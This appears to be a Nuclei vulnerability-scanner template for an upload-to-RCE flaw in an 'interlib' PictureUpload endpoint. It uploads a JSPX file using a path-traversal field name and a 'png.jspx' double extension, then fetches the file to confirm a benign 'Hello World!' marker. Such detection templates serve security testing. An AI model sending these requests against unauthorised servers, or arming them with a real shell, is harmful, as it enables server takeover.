id: TuChuang-PictureUpload-UploadToRCE

info:
  name: TuChuang-PictureUpload-UploadToRCE
  author: iSee857
  severity: critical
  description: TuChuang-PictureUpload-UploadToRCE
  reference:
    - https://example.com/vuln-details
  tags: file-upload,jsp,rce

http:
  - raw:
      - |
        POST /interlib/loan/PictureUpload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
        Accept-Encoding: gzip, deflate

        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="/../hello"; filename="hello.png.jspx"
        Content-Type: image/jpeg

        <?xml version="1.0" encoding="UTF-8"?>
        <jsp:root 
            xmlns:jsp="http://java.sun.com/JSP/Page"
            version="2.0">

            <jsp:text>Hello World!</jsp:text>
        </jsp:root>
        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--

      - |
          GET /interlib/hello.png.jspx HTTP/1.1
          Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Hello World!"
        condition: and
        part: body